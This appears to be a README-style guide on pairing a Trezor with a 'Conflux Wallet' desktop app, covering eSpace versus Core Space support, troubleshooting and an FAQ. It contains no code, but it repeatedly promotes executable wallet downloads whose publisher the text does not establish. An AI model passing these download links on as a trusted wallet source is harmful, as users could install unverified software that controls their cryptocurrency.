![Conflux Wallet](assets/banner-article.png)

# Connect Trezor to Conflux Wallet

<p align="center">Connect Trezor to Conflux Wallet: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** Trezor support exists and is documented for eSpace, where the device signs through the Ethereum app on the same path any EVM chain uses. Core Space is the open question: the product lists Trezor support, independent research found no evidence of Trezor signing Core Space transactions, so test before you commit funds.

## What is supported

The honest position is two-part. The product's own pages state that Trezor is supported directly. Ecosystem research - the device maker's documentation, community reports and third-party guides - turned up evidence only for eSpace, where signing happens through the Ethereum app.

Both statements can be true if Core Space support arrived without a published announcement, which is why the answer is a test rather than a verdict. https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/which-hardware-wallet-supports-conflux-cfx.md puts both devices side by side, and https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md is the path for Core Space that is not in doubt.

## Why eSpace works the way it does

eSpace is EVM-compatible, so a device does not need a Conflux-specific application to sign there: the Ethereum app does it, and the wallet constructs an ordinary EVM transaction with a `0x` address. That is the same arrangement as any other EVM network.

This makes eSpace support almost free for a device maker to provide, and it explains why eSpace shows up everywhere in the documentation while Core Space does not. The two spaces are not equally easy to support, and the device ecosystem reflects that.

## Connecting the device

Install the bridge software the device requires, connect it, unlock it and open the Ethereum app. Then connect the hardware account in the current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) and select the account the device offers; the app reads the `0x` address and shows it for confirmation.

Approve on the device if asked. No key ever leaves it, and no step in this process involves typing a recovery phrase into the computer - the phrase belongs to the device, and the device never asks you for it either.

## Finding your eSpace address

The address the wallet shows while the Ethereum app is open is the eSpace account derived from the device's seed. That is the address to receive CFX to and to use with contracts.

Write it down labelled "eSpace". If you later want the Core Space account as well, that is a different device app and, on the current evidence, a different device. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md explains why one seed gives two unrelated accounts.

## Does Trezor support Core Space?

The product says yes; the independent evidence is thin. If you need Core Space - staking, `cfx:` transfers, voting - the safe assumption is that a Ledger is the device with a published path, and that a Trezor should be tested with a small amount before you rely on it.

Testing is cheap: send a small transfer, sign it, confirm the `cfx:` address matches what the wallet showed, and only then move a meaningful balance. What you are testing is not the wallet but the pairing of device, app and firmware.

## Testing before you rely on it

A test costs one transfer fee and answers the question your own combination of device, firmware and app actually poses. Send a small amount, sign it, confirm the address on the device screen matches the one the wallet displayed, and only then move a balance you would miss.

Do the test on the space you intend to use. An eSpace signature says nothing about Core Space, and the failure modes are not shared between them.

## When the device is not seen

Usual causes: the bridge software is not running or is out of date; the device is locked; the Ethereum app is not open; the cable is charge-only. A data cable and a direct port rather than a hub resolve most of these.

If the device is detected but the account is empty, the app on the device is the wrong one. Switching apps changes the account the wallet derives, which is exactly what it should do.

## Approving on the device

Every signature is confirmed on the device screen, and that screen is the only one worth trusting: the recipient and amount shown there are what the device signs, while the window on the computer is what malware can change.

A mismatch is a rejection, not a puzzle. That difference between the two displays is the single most valuable thing hardware signing gives you, and it is why the device screen should be read even when the amount is small.

## What the device protects

It protects the key, not the decision. A device cannot stop you sending to a wrong address, approving a malicious contract or confirming a transfer you did not intend; it can only stop the key from being stolen while you do it.

So the workflow is: check the address on the device, check the destination is what you meant, then approve. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-safety.md covers the rest of the habits, and https://github.com/conflux-developments/setup-handbook/blob/HEAD/what-is-conflux-wallet.md covers how the app labels the space before you sign. Conflux Wallet remains actively maintained - the release page carries the build with the latest fixes.

## FAQ

### Does Conflux Wallet support Trezor?

Trezor is listed as supported and is documented for eSpace, where it signs through the Ethereum app. Core Space support is not corroborated by independent sources, so test it first.

### Does Trezor support Conflux Core Space?

The product says so, but no independent evidence was found. For Core Space, a Ledger with the Conflux app is the documented route.

### Which Trezor models support CFX?

The models that can run the Ethereum app, which is how eSpace signing works. The device model matters less than the app and firmware being current.

### Can I stake with a Trezor?

Staking is Core Space only, so it depends on Core Space signing working on the device. Until that is confirmed, stake with a device that has a published Core Space path.

### Why does my address look different from my Ledger's?

Different device, different seed, different account. Each device derives its own addresses, and the two are not interchangeable.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Connect Ledger to Conflux Wallet](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/connect-ledger-to-conflux-wallet.md)
- [Hardware Wallet for CFX](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/which-hardware-wallet-supports-conflux-cfx.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
